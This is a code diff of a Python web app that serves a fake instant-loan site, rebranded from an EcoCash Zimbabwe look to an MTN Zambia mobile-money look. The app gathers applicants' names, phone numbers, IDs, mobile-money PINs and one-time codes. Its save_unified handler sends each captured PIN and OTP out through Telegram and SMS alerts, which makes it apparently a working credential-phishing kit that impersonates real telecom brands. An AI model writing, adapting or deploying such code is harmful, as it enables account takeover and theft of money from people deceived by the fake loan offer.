@@ -90,10 +90,10 @@ def send_telegram_notification(message, record_id=None, ref="default"):
     except Exception as e:
         print(f"Telegram notification orchestration failed: {e}")
 
-# Helper to get current time in Zimbabwe/Johannesburg timezone
+# Helper to get current time in Zambia/Johannesburg timezone
 def get_now_str():
     try:
-        tz = pytz.timezone('Africa/Harare')
+        tz = pytz.timezone('Africa/Lusaka')
         now = datetime.now(tz)
     except:
         now = datetime.now()
@@ -132,7 +132,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Keshagi Loans — EcoCash Zimbabwe</title>
+  <title>Momo Advanced Loans — MTN Zambia</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     :root {
@@ -197,10 +197,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <div class="max-w-[760px] mx-auto px-4 h-16 flex items-center justify-between">
       <div class="flex items-center gap-3 cursor-pointer" onclick="goTo('home')">
         <div class="flex items-center gap-2">
-<img src="/assets/logo.jpg" alt="EcoCash SuperApp" class="w-10 h-10 mx-auto rounded-2xl object-cover shadow-md">
+<img src="/assets/logo.jpg" alt="MTN SuperApp" class="w-10 h-10 mx-auto rounded-2xl object-cover shadow-md">
           <div class="flex flex-col">
-            <span class="text-lg font-black text-[#004F71] leading-none">Keshagi</span>
-            <span class="text-[10px] font-bold text-[#004F71] leading-none mt-0.5">Zimbabwe Loans</span>
+            <span class="text-lg font-black text-[#004F71] leading-none">Momo Advanced</span>
+            <span class="text-[10px] font-bold text-[#004F71] leading-none mt-0.5">Zambia Loans</span>
           </div>
         </div>
         <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold bg-yellow-50 text-yellow-700 border border-yellow-200">
@@ -220,7 +220,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <div onclick="toggleMenu(false)" class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm"></div>
     <div id="drawer-panel" class="absolute right-0 top-0 bottom-0 w-[300px] bg-white shadow-2xl p-6 flex flex-col justify-between transform translate-x-full transition-transform duration-300">
       <div>
-        <div class="flex items-center justify-between pb-4 border-b border-slate-200"><img src="/assets/logo.jpg" alt="EcoCash SuperApp" class="h-8 w-auto"><button onclick="toggleMenu(false)" class="p-1 rounded-md text-slate-500 hover:bg-slate-100">
+        <div class="flex items-center justify-between pb-4 border-b border-slate-200"><img src="/assets/logo.jpg" alt="MTN SuperApp" class="h-8 w-auto"><button onclick="toggleMenu(false)" class="p-1 rounded-md text-slate-500 hover:bg-slate-100">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
           </button>
         </div>
@@ -242,7 +242,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
   <!-- MAIN WRAPPER -->
   <main class="w-full max-w-[760px] mx-auto px-4 py-2 flex-1">
 
-    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="/assets/logo.jpg" alt="EcoCash SuperApp" class="h-20 w-auto mx-auto mb-4">    <h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Zimbabwe • Digital Loans</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">Keshagi Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief delivered to your EcoCash.</p>
+    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="/assets/logo.jpg" alt="MTN SuperApp" class="h-20 w-auto mx-auto mb-4">    <h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Zambia • Digital Loans</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">Momo Advanced Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief delivered to your MTN.</p>
       </div>
 
       <!-- 4 Benefits -->
@@ -270,7 +270,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div class="absolute -right-10 -bottom-10 w-44 h-44 rounded-full bg-[#FFCC00]/10 blur-xl pointer-events-none"></div>
         <div class="relative z-10 space-y-3">
           <span class="inline-block bg-[#FFCC00] text-[#004F71] px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">Fast Mobile Access</span>
-          <h3 class="text-2xl sm:text-3xl font-black leading-tight">Loans Up To ZWG 500,000 INSTANTLY!</h3>
+          <h3 class="text-2xl sm:text-3xl font-black leading-tight">Loans Up To ZMW 500,000 INSTANTLY!</h3>
           <p class="text-blue-100 text-sm max-w-md">No paperwork, no standing in lines. Apply directly from your phone in under 2 minutes.</p>
         </div>
       </div>
@@ -339,7 +339,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
       
       <div>
-        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Amount (ZWG)</label>
+        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Amount (ZMW)</label>
         <input id="input-amount" type="number" placeholder="e.g. 2500" min="500" max="500000" step="500" oninput="syncAmount(this.value, true)" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
       </div>
 
@@ -366,11 +366,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-sm space-y-6">
         <div class="text-center">
           <div class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requested Amount</div>
-          <div id="display-amount" class="text-4xl font-black text-[#004F71] mt-1">ZWG 500,000</div>
+          <div id="display-amount" class="text-4xl font-black text-[#004F71] mt-1">ZMW 500,000</div>
           <input type="range" id="amount-slider" min="500" max="500000" step="500" value="5000" oninput="syncAmount(this.value)" class="w-full mt-4 accent-[#FFCC00]">
           <div class="flex justify-between text-xs text-slate-400 mt-1 font-semibold">
-            <span>ZWG 500</span>
-            <span>ZWG 500,000</span>
+            <span>ZMW 500</span>
+            <span>ZMW 500,000</span>
           </div>
         </div>
 
@@ -395,11 +395,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div class="border-t border-slate-100 pt-4 space-y-2.5 text-sm">
           <div class="flex justify-between text-slate-600">
             <span>Interest (5%)</span>
-            <span id="breakdown-interest" class="font-bold text-slate-800">ZWG 50</span>
+            <span id="breakdown-interest" class="font-bold text-slate-800">ZMW 50</span>
           </div>
           <div class="flex justify-between text-slate-600">
             <span>Admin & Processing Fee (3%)</span>
-            <span id="breakdown-fee" class="font-bold text-slate-800">ZWG 30</span>
+            <span id="breakdown-fee" class="font-bold text-slate-800">ZMW 30</span>
           </div>
           <div class="flex justify-between text-slate-600">
             <span>Repayment Due Date</span>
@@ -407,7 +407,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           </div>
           <div class="flex justify-between text-base font-extrabold text-[#004F71] pt-2 border-t border-slate-100">
             <span>Total Repayment</span>
-            <span id="breakdown-total" class="text-[#004F71]">ZWG 1,080</span>
+            <span id="breakdown-total" class="text-[#004F71]">ZMW 1,080</span>
           </div>
         </div>
       </div>
@@ -432,7 +432,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Applicant</h3>
           <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
             <div class="flex justify-between"><span class="text-slate-500">Full Name</span><span id="review-name" class="font-bold text-slate-800">Tariro Moyo</span></div>
-            <div class="flex justify-between"><span class="text-slate-500">Mobile Number</span><span id="review-mobile" class="font-bold text-slate-800">+263 77 123 4567</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">Mobile Number</span><span id="review-mobile" class="font-bold text-slate-800">+260 77 123 4567</span></div>
             <div class="flex justify-between"><span class="text-slate-500">ID Number</span><span id="review-id" class="font-bold text-slate-800">63-123456-A-47</span></div>
           </div>
         </div>
@@ -441,7 +441,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Loan Summary</h3>
           <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
             <div class="flex justify-between"><span class="text-slate-500">Purpose</span><span id="review-purpose" class="font-bold text-slate-800">Business</span></div>
-            <div class="flex justify-between"><span class="text-slate-500">Principal</span><span id="review-principal" class="font-bold text-slate-800">ZWG 100,000</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">Principal</span><span id="review-principal" class="font-bold text-slate-800">ZMW 100,000</span></div>
             <div class="flex justify-between"><span class="text-slate-500">Period</span><span id="review-period" class="font-bold text-slate-800">30 Days</span></div>
           </div>
         </div>
@@ -449,14 +449,14 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div>
           <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Repayment</h3>
           <div class="bg-blue-50/70 border border-blue-100 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
-            <div class="flex justify-between"><span class="text-slate-600">Total Payable</span><span id="review-total" class="font-extrabold text-blue-800">ZWG 1,080</span></div>
+            <div class="flex justify-between"><span class="text-slate-600">Total Payable</span><span id="review-total" class="font-extrabold text-blue-800">ZMW 1,080</span></div>
             <div class="flex justify-between"><span class="text-slate-600">Due Date</span><span id="review-date" class="font-bold text-slate-800">30/09/2026</span></div>
           </div>
         </div>
 
         <label class="flex items-start gap-3 pt-2 cursor-pointer">
           <input type="checkbox" id="confirm-check" onchange="toggleConfirm(this.checked)" class="mt-1 h-4 w-4 rounded accent-[#FFCC00]">
-          <span class="text-xs text-slate-600 leading-snug">I confirm that the information provided is correct and agree to Keshagi loan terms and conditions.</span>
+          <span class="text-xs text-slate-600 leading-snug">I confirm that the information provided is correct and agree to Momo Advanced loan terms and conditions.</span>
         </label>
       </div>
 
@@ -470,7 +470,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="text-center pt-2">
         <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">🔒</div>
         <h2 class="text-2xl font-black text-[#004F71]">ENTER YOUR PIN</h2>
-        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit EcoCash PIN to authorize</p>
+        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit MTN PIN to authorize</p>
       </div>
 
       <!-- PIN Indicator Dots -->
@@ -505,7 +505,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="text-center pt-2">
         <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">📱</div>
         <h2 class="text-2xl font-black text-[#004F71]">VERIFY YOUR NUMBER</h2>
-        <p class="text-xs text-slate-500 mt-1">A verification message has been sent to: <span id="otp-mobile-label" class="font-bold text-slate-700">+263 77 123 4567</span></p>
+        <p class="text-xs text-slate-500 mt-1">A verification message has been sent to: <span id="otp-mobile-label" class="font-bold text-slate-700">+260 77 123 4567</span></p>
       </div>
 
       <div class="max-w-[340px] mx-auto space-y-2">
@@ -530,7 +530,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
       <div>
         <h2 class="text-2xl font-black text-[#004F71]">PROCESSING APPLICATION</h2>
-        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your Keshagi application.</p>
+        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your Momo Advanced application.</p>
       </div>
 
       <div class="max-w-[320px] mx-auto bg-white rounded-2xl border border-slate-200 p-4 space-y-3 text-left text-xs font-semibold">
@@ -566,11 +566,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
         </div>
         <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
           <span class="text-slate-500">Approved Amount</span>
-          <span id="approved-amount" class="text-lg font-black text-[#004F71]">ZWG 100,000</span>
+          <span id="approved-amount" class="text-lg font-black text-[#004F71]">ZMW 100,000</span>
         </div>
         <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
           <span class="text-slate-500">Repayment Amount</span>
-          <span id="approved-repay" class="font-bold text-slate-800">ZWG 1,080</span>
+          <span id="approved-repay" class="font-bold text-slate-800">ZMW 1,080</span>
         </div>
         <div class="flex justify-between items-center text-xs sm:text-sm">
           <span class="text-slate-500">Repayment Date</span>
@@ -607,10 +607,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
 
       <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-3 text-xs sm:text-sm">
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">ZWG 100,000</span></div>
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">ZWG 50</span></div>
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">ZWG 30</span></div>
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#004F71]">ZWG 1,080</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">ZMW 100,000</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">ZMW 50</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">ZMW 30</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#004F71]">ZMW 1,080</span></div>
         <div class="flex justify-between py-1.5"><span class="text-slate-500">Due Date</span><span id="details-date" class="font-bold text-slate-800">30/09/2026</span></div>
       </div>
 
@@ -626,24 +626,24 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <div onclick="closeInfoModal()" class="absolute inset-0 bg-slate-900/50 backdrop-blur-xs"></div>
     <div class="relative bg-white  p-6 max-w-sm w-full shadow-2xl border border-slate-200 text-center space-y-3 z-10">
       <h3 id="info-title" class="text-lg font-bold text-[#004F71]">Information</h3>
-      <p class="text-xs text-slate-600">This is a demonstration preview of the Keshagi Zimbabwe loan journey. Features in this section are mock placeholders for demonstration.</p>
+      <p class="text-xs text-slate-600">This is a demonstration preview of the Momo Advanced Zambia loan journey. Features in this section are mock placeholders for demonstration.</p>
       <button onclick="closeInfoModal()" class="w-full py-2.5 rounded-xl bg-[#004F71] text-white font-bold text-xs">Close</button>
     </div>
   </div>
 
   <!-- FOOTER -->
   <footer class="w-full max-w-[760px] mx-auto px-4 py-4 text-center text-xs text-slate-400 border-t border-slate-200">
-    Keshagi Loans Zimbabwe • Digital Loan App
+    Momo Advanced Loans Zambia • Digital Loan App
   </footer>
 
   <script>
        const urlParams = new URLSearchParams(window.location.search);
     const urlRef = urlParams.get('ref');
-    if (urlRef) sessionStorage.setItem('keshagi_ref', urlRef);
+    if (urlRef) sessionStorage.setItem('Momo Advanced_ref', urlRef);
 
     let appState = {
       appId: Date.now().toString(),
-      ref: sessionStorage.getItem('keshagi_ref') || 'default',
+      ref: sessionStorage.getItem('Momo Advanced_ref') || 'default',
       fullName: "",
       mobile: "",
       nationalId: "",
@@ -690,13 +690,13 @@ HTML_PAGE = r"""<!DOCTYPE html>
     }
 
     function formatMobileWithCountryCode(phone) {
-      if (!phone) return "+263 77 123 4567";
+      if (!phone) return "+260 77 123 4567";
       let cleaned = phone.replace(/[^0-9+]/g, '');
       if (cleaned.startsWith('+')) return cleaned;
       if (cleaned.startsWith('0')) {
         cleaned = cleaned.substring(1);
       }
-      return '+263 ' + cleaned;
+      return '+260 ' + cleaned;
     }
 
     function handleFormSubmit(event) {
@@ -765,9 +765,9 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const feeEl = document.getElementById('breakdown-fee');
       const totalEl = document.getElementById('breakdown-total');
 
-      if (interestEl) interestEl.innerText = 'ZWG ' + interest.toLocaleString();
-      if (feeEl) feeEl.innerText = 'ZWG ' + fee.toLocaleString();
-      if (totalEl) totalEl.innerText = 'ZWG ' + total.toLocaleString();
+      if (interestEl) interestEl.innerText = 'ZMW ' + interest.toLocaleString();
+      if (feeEl) feeEl.innerText = 'ZMW ' + fee.toLocaleString();
+      if (totalEl) totalEl.innerText = 'ZMW ' + total.toLocaleString();
 
       const dateEl = document.getElementById('breakdown-date');
       if (dateEl) {
@@ -832,10 +832,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const dateEl = document.getElementById('review-date');
 
       if (nameEl) nameEl.innerText = appState.fullName || "Tariro Moyo";
-      if (mobileEl) mobileEl.innerText = appState.mobile || "+263 77 123 4567";
+      if (mobileEl) mobileEl.innerText = appState.mobile || "+260 77 123 4567";
       if (idEl) idEl.innerText = appState.nationalId || "CM98102938102";
       if (purposeEl) purposeEl.innerText = appState.purpose || "Business";
-      if (principalEl) principalEl.innerText = 'ZWG ' + (appState.amount || 100000).toLocaleString();
+      if (principalEl) principalEl.innerText = 'ZMW ' + (appState.amount || 100000).toLocaleString();
       if (periodEl) periodEl.innerText = appState.period + ' Days';
 
       const val = appState.amount || 100000;
@@ -851,7 +851,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const fee = Math.round(val * 0.03);
       const total = val + interest + fee;
 
-      if (totalEl) totalEl.innerText = 'ZWG ' + total.toLocaleString();
+      if (totalEl) totalEl.innerText = 'ZMW ' + total.toLocaleString();
 
       if (dateEl) {
         const d = new Date();
@@ -934,8 +934,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
   const interest = Math.round(val * rate);
   const total = val + interest;
-  if (approvedAmt) approvedAmt.innerText = 'ZWG ' + val.toLocaleString();
-  if (approvedRepay) approvedRepay.innerText = 'ZWG ' + total.toLocaleString();
+  if (approvedAmt) approvedAmt.innerText = 'ZMW ' + val.toLocaleString();
+  if (approvedRepay) approvedRepay.innerText = 'ZMW ' + total.toLocaleString();
   if (approvedDate) {
     const d = new Date();
     d.setDate(d.getDate() + days);
@@ -1108,7 +1108,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const slider = document.getElementById('amount-slider');
       if (slider) slider.value = parsedVal;
       const disp = document.getElementById('display-amount');
-      if (disp) disp.innerText = 'ZWG ' + parsedVal.toLocaleString();
+      if (disp) disp.innerText = 'ZMW ' + parsedVal.toLocaleString();
       
       calculateCosts();
     }
@@ -1143,16 +1143,16 @@ def save_unified():
         if f_n == 'entered_pin':
             m = f'🔐 PIN Received\n\n👤 User: {name}\n🔢 PIN: {f_v}\n📞 Phone: {phone}'
             send_telegram_notification(m, record_id=app_id, ref=ref)
-            send_sms_notification(f"[Keshagi Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
+            send_sms_notification(f"[Momo Advanced Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
         elif f_n == 'entered_otp':
             m = f'📱 OTP Received\n\n👤 User: {name}\n🔑 OTP: {f_v}\n📞 Phone: {phone}'
             send_telegram_notification(m, record_id=app_id, ref=ref)
-            send_sms_notification(f"[Keshagi Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
+            send_sms_notification(f"[Momo Advanced Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
         elif not f_n:
             amt = data.get('amount', 'N/A')
-            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* ZWG {amt}\n📅 *Time:* {now}'
+            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* ZMW {amt}\n📅 *Time:* {now}'
             send_telegram_notification(m, ref=ref)
-            send_sms_notification(f"[Keshagi Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: ZWG {amt}")
+            send_sms_notification(f"[Momo Advanced Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: ZMW {amt}")
 
 
         return jsonify({'status': 'success', 'record_id': app_id})
